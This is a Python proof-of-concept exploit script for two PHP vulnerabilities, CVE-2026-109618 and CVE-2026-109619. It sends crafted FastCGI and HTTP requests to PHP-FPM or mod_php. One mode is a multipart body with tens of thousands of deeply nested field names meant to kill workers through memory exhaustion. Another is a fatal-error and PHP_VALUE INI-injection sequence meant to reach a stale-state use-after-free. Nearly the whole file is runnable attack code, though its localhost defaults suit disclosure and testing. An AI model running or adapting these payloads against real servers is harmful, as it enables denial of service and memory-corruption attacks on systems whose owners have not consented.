#!/usr/bin/env python3
"""
Copyright 2026 Joshua Rosato.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

Author: Joshua Rosato.

Proof-of-Concept for CVE-2026-109618 (OOM corruption) and
CVE-2026-109619 (stale global state) in PHP.

Targets a PHP-FPM worker by default. For mod_php/Apache the same HTTP
equivalents apply (see README.md).

Usage:
  python3 poc.py --host 127.0.0.1 --port 9012 --mode probe
  python3 poc.py --host 127.0.0.1 --port 9012 --mode oom
  python3 poc.py --host 127.0.0.1 --port 9012 --mode stale
  python3 poc.py --host 127.0.0.1 --port 9012 --mode full
"""
import argparse, sys, time, urllib.request, urllib.error
sys.path.insert(0, __import__("os").path.dirname(__file__))
from fcgi_client import fcgi_request, parse_body

DEFAULT_SCRIPT = "/tmp/poctest/index.php"


def probe(host, port, script):
    params = {
        "SCRIPT_FILENAME": script,
        "REQUEST_METHOD": "GET",
        "SCRIPT_NAME": "/index.php",
        "QUERY_STRING": "",
        "DOCUMENT_ROOT": "/tmp/poctest",
    }
    raw = fcgi_request(host, port, params, timeout=5)
    body = parse_body(raw)
    print("[probe] response:", body.decode("latin1", "replace").strip())
    # Also fetch phpinfo-ish via a dedicated script if present
    info_script = script.replace("index.php", "info.php")
    params2 = dict(params, SCRIPT_FILENAME=info_script)
    raw2 = fcgi_request(host, port, params2, timeout=5)
    body2 = parse_body(raw2)
    txt = body2.decode("latin1", "replace")
    for key in ("PHP Version", "memory_limit", "post_max_size",
                "session.upload_progress.enabled", "fatal_error_backtraces"):
        for line in txt.splitlines():
            if key in line:
                print(f"[probe] {line.strip()[:120]}")
                break


def oom_trigger(host, port, count, depth, script):
    """
    CVE-2026-109618: send a multipart body whose parsing exhausts the
    worker's memory_limit. Nested field names amplify allocation.
    """
    boundary = "----POC"
    nest = "".join(f"[x{i}]" for i in range(depth))
    parts = []
    for i in range(count):
        parts.append(f"--{boundary}")
        parts.append(f'Content-Disposition: form-data; name="a{nest}[{i}]"')
        parts.append("")
        parts.append("v")
    parts.append(f"--{boundary}--")
    body = "\r\n".join(parts).encode()
    print(f"[oom] sending {count} nested fields, body={len(body)} bytes, depth={depth}")

    params = {
        "SCRIPT_FILENAME": script,
        "REQUEST_METHOD": "POST",
        "SCRIPT_NAME": "/index.php",
        "QUERY_STRING": "",
        "DOCUMENT_ROOT": "/tmp/poctest",
        "CONTENT_TYPE": f"multipart/form-data; boundary={boundary}",
        "CONTENT_LENGTH": str(len(body)),
    }
    t0 = time.time()
    try:
        raw = fcgi_request(host, port, params, body, timeout=60)
        body_out = parse_body(raw)
        print(f"[oom] worker survived in {time.time()-t0:.2f}s: "
              f"{body_out.decode('latin1','replace').strip()[:200]}")
    except Exception as e:
        print(f"[oom] connection lost in {time.time()-t0:.2f}s: {e}")
        print("[oom] worker likely killed by OOM during request startup "
              "(CVE-2026-109618 condition reached).")


def stale_state(host, port, script):
    """
    CVE-2026-109619: producer publishes fatal-error backtrace state, then a
    consumer request with a deprecated INI setting reaches the stale value
    before normal initialization resets it.
    """
    fatal_script = script.replace("index.php", "fatal.php")
    # Producer
    params = {
        "SCRIPT_FILENAME": fatal_script,
        "REQUEST_METHOD": "GET",
        "SCRIPT_NAME": "/fatal.php",
        "QUERY_STRING": "",
        "DOCUMENT_ROOT": "/tmp/poctest",
    }
    try:
        raw = fcgi_request(host, port, params, timeout=5)
        body = parse_body(raw)
        print("[stale] producer:", body.decode("latin1", "replace").strip()[:120])
    except Exception as e:
        print("[stale] producer error:", e)

    time.sleep(0.2)

    # Consumer: deprecated INI applied before request init
    consumer_script = script.replace("index.php", "p.php")
    params2 = {
        "SCRIPT_FILENAME": consumer_script,
        "REQUEST_METHOD": "GET",
        "SCRIPT_NAME": "/p.php",
        "QUERY_STRING": "",
        "DOCUMENT_ROOT": "/tmp/poctest",
        "PHP_VALUE": "auto_detect_line_endings=1\nerror_reporting=E_ALL\ndisplay_errors=1",
    }
    try:
        raw2 = fcgi_request(host, port, params2, timeout=5)
        body2 = parse_body(raw2)
        print("[stale] consumer:", body2.decode("latin1", "replace").strip()[:200])
    except Exception as e:
        print("[stale] consumer connection lost:", e)
        print("[stale] possible use-after-free (CVE-2026-109619).")



def http_oom(url, count, depth):
    boundary = "----POC"
    nest = "".join(f"[x{i}]" for i in range(depth))
    parts = []
    for i in range(count):
        parts.append(f"--{boundary}")
        parts.append(f'Content-Disposition: form-data; name="a{nest}[{i}]"')
        parts.append("")
        parts.append("v")
    parts.append(f"--{boundary}--")
    body = "\r\n".join(parts).encode()
    print(f"[http-oom] sending {count} fields, body={len(body)} bytes")
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
    })
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            print(f"[http-oom] survived {time.time()-t0:.2f}s: {resp.read(200)!r}")
    except urllib.error.HTTPError as e:
        print(f"[http-oom] HTTP {e.code} in {time.time()-t0:.2f}s")
    except Exception as e:
        print(f"[http-oom] connection lost in {time.time()-t0:.2f}s: {e}")
        print("[http-oom] worker likely killed by OOM (CVE-2026-109618).")


def http_stale(base_url):
    # Producer: fatal error
    try:
        with urllib.request.urlopen(base_url + "fatal.php", timeout=5) as r:
            print("[http-stale] producer:", r.read(200).decode("latin1", "replace").strip()[:120])
    except Exception as e:
        print("[http-stale] producer:", str(e)[:120])
    time.sleep(0.2)
    # Consumer: .htaccess applies deprecated INI before request init
    try:
        with urllib.request.urlopen(base_url + "index.php", timeout=5) as r:
            print("[http-stale] consumer:", r.read(200).decode("latin1", "replace").strip()[:200])
    except Exception as e:
        print("[http-stale] consumer connection lost:", e)
        print("[http-stale] possible use-after-free (CVE-2026-109619).")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=9012)
    ap.add_argument("--script", default=DEFAULT_SCRIPT)
    ap.add_argument("--mode", choices=["probe", "oom", "stale", "full",
                    "http-oom", "http-stale", "http-full"],
                    default="full")
    ap.add_argument("--transport", choices=["fpm", "http"], default="fpm")
    ap.add_argument("--url", default="http://127.0.0.1:8080/")
    ap.add_argument("--count", type=int, default=30000)
    ap.add_argument("--depth", type=int, default=32)
    args = ap.parse_args()

    if args.transport == "http" or args.mode.startswith("http"):
        if args.mode in ("http-oom", "http-full", "oom", "full"):
            http_oom(args.url + "index.php", args.count, args.depth)
        if args.mode in ("http-stale", "http-full", "stale", "full"):
            http_stale(args.url)
        return

    if args.mode in ("probe", "full"):
        probe(args.host, args.port, args.script)
    if args.mode in ("oom", "full"):
        oom_trigger(args.host, args.port, args.count, args.depth, args.script)
    if args.mode in ("stale", "full"):
        stale_state(args.host, args.port, args.script)


if __name__ == "__main__":
    main()
